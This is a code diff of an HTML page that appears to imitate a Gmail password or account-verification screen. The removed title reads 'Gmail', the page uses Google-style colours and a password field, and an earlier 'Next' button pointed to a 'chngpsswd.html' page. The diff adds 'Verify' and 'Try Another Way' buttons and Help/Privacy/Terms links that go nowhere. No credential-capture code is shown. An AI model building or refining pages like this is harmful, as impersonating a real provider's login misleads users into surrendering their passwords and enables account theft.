@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gmail</title>
+    <title>Account Verification</title>
     <style>
         /* CSS for styling the page */
         body {
@@ -14,20 +14,21 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            flex-direction: column;
             height: 100vh;
         }
 
         .container {
             background-color: white;
             padding: 30px;
-            border-radius: 8px;
+            border-radius: 12px; /* More rounded corners */
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            max-width: 600px; /* Increased max-width */
+            max-width: 500px;
             width: 100%;
             text-align: center;
         }
-        
-        @media screen and (max-width: 785px) {
+
+@media screen and (max-width: 785px) {
  .container {
         width: 100%;
         margin: -100;
@@ -53,7 +54,7 @@
       }
     }
     
-        
+
         .logo {
             margin-bottom: 20px;
         }
@@ -107,26 +108,59 @@
             margin-right: 5px;
         }
 
+        .button-container {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
         .button {
             background-color: #1a73e8;
             color: white;
             font-size: 14px;
             padding: 10px;
             border: none;
-            border-radius: 4px;
+            border-radius: 20px; /* Rounded button edges */
             width: 100%;
             cursor: pointer;
-            margin-top: 10px;
+            flex: 1;
         }
 
         .button:hover {
             background-color: #1669c1;
         }
 
+        .button.secondary {
+            background-color: white; /* White background */
+            color: #1a73e8; /* Blue text color */
+            border: 1px solid #1a73e8; /* Blue border */
+        }
+
+        .button.secondary:hover {
+            background-color: #f1f1f1; /* Light grey on hover */
+        }
+
         .footer {
             font-size: 12px;
             color: #5f6368;
             margin-top: 20px;
+        }
+
+        .footer-nav {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #5f6368;
+            display: flex;
+            gap: 15px;
+        }
+
+        .footer-nav a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+
+        .footer-nav a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
@@ -149,14 +183,31 @@
                 <label for="showPassword">Show password</label>
             </div>
 
-            <button type="button" class="button" onclick="chngpsswd.html">Next</button>
+            <!-- Button Container with two buttons -->
+            <div class="button-container">
+                <button type="button" class="button secondary" onclick="">Try Another Way</button>
+                <button type="button" class="button" onclick="">Verify</button>
+            </div>
         </form>
 
         <div class="footer">Need help? Visit the <a href="#">Help Center</a></div>
     </div>
 
+    <!-- Footer Navigation Menu -->
+    <div class="footer-nav">
+        <a href="#">Help</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+    </div>
+
     <script>
-        
+
+        // JavaScript function for 'Try Another Way' button
+        function tryAnotherWay() {
+            alert('Please try another way to verify your account.');
+            // Here, you can add logic to handle alternative verification methods
+        }
+
         // JavaScript function to toggle password visibility
         function togglePasswordVisibility() {
             const passwordInput = document.getElementById('code');
